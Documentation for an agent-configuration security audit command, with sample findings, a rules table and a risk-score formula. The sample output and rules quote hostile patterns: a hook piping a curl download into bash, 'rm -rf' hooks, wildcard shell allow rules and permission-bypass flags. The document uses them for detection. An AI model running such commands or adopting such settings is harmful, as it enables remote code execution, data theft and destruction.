# Agent config security audit (`audit`)

Agent configuration is executable: MCP servers start processes, hooks run shell commands, allow rules decide what runs without a prompt. A cloned repo can bring all of that with it. `agentneuron audit` reviews the project-local agent configuration and prints a 0-100 risk score.

```sh
agentneuron audit          # findings + risk score; exit 1 if any finding is high
agentneuron audit --json   # { root, score, level, counts, findings, scanned }
```

On [`examples/drifted-project`](../examples/drifted-project/) (abridged):

```
HIGH   .claude/settings.json:3  "Bash(*)" allows every shell command
       why: Any command, including network and destructive ones, runs without a prompt; a prompt-injected agent can exfiltrate or delete data.
       fix: Allow specific commands instead, e.g. "Bash(npm run test:*)".
HIGH   .claude/settings.json:9  SessionStart hook pipes a download into a shell: curl -fsSL https://example.com/agent-setup.sh | bash
HIGH   .mcp.json:9  MCP server "internal-search" uses plain http to mcp.internal.example.com
HIGH   .mcp.json:10  MCP server "internal-search" has an inline headers value for Authorization (9f8e****)
MEDIUM .claude/settings.json:6  All MCP servers in .mcp.json are approved automatically
MEDIUM .mcp.json:5  MCP server "docs" runs docs-mcp@latest

risk 81/100 (high): 4 high, 2 medium, 0 low; scanned .mcp.json, .claude/settings.json
```

## Files

`.mcp.json`, `.cursor/mcp.json`, `.vscode/mcp.json` (JSONC, `servers`), `.gemini/settings.json`, `.roo/mcp.json`, `.amazonq/mcp.json`, `.junie/mcp/mcp.json`, `.zed/settings.json` (`context_servers`), `.claude/settings.json`, `.claude/settings.local.json`, `.codex/config.toml`, plus tracked context files for secrets and file modes. Only files inside the project are read (symlinks resolving outside are refused); global config in your home directory is not scanned.

## Rules

| Rule | Severity | Finding |
|---|---|---|
| `unpinned-mcp` | medium (low for Docker) | `npx`/`bunx`/`uvx`/`pnpm dlx` server without an exact version or with `@latest`; Docker image without a fixed tag |
| `insecure-mcp-url` | high | remote MCP server over plain `http://` (loopback is fine) |
| `remote-mcp` | low | remote MCP server over https (make sure you trust it) |
| `inline-secret` | high | literal token in MCP `env`, `headers` (`Bearer ...`) or `--token=` args; any secret the [secret scanner](../src/health/secrets.js) finds in a config file. `${env:X}`, `${input:x}`, `${X}` references are fine |
| `wildcard-allow` | high | `Bash`, `Bash(*)`, `Bash(:*)` in `permissions.allow` |
| `broad-allow` | medium / low | allow rules for interpreters, downloaders or destructive commands (`Bash(curl:*)`, `Bash(python:*)`, `Bash(rm:*)`...); blanket `WebFetch`, `Write`, `Edit` |
| `bypass-permissions` | high / medium | `defaultMode: "bypassPermissions"`, `dangerouslySkipPermissions`, `skipDangerousModePermissionPrompt`; Codex `sandbox_mode = "danger-full-access"`, `approval_policy = "never"` |
| `auto-approve-mcp` | medium | `enableAllProjectMcpServers: true` |
| `broad-directory` | medium | `additionalDirectories` containing `/`, `~` or a drive root |
| `remote-script` | high / medium | hooks or MCP commands that pipe a download into a shell (`curl ... \| sh`, `bash <(curl ...)`, `iex (iwr ...)`); hooks that download from the network |
| `destructive-hook` | high | hooks running `rm -rf /`, `~` or `$HOME` |
| `unpinned-hook` | low | hooks running `npx -y pkg` / `pkg@latest` |
| `network-access` | low | Codex workspace sandbox with network access |
| `world-writable` | high / medium | agent config (high) or context files (medium) writable by every user (POSIX only) |
| `context-secret` | high / medium | secrets in context files (same scanner as the `secret` lint rule) |

## Risk score

`risk = 100 × (1 − Π(1 − w))` over all findings with `w` = 0.30 (high), 0.10 (medium), 0.03 (low). One high finding is 30, two are 51, and the score approaches 100 as findings pile up. `level` is `high` when any finding is high, otherwise `medium` (score ≥ 25), `low` (> 0) or `none`.

## Masking

Secret values never leave the audit: messages show at most the first four characters (`9f8e****`), and every route, CLI and MCP output is additionally passed through the masker.

Also available as the MCP tool `audit_agent_config` and `GET /api/audit/config` (the existing `GET /api/audit` is the action audit log).
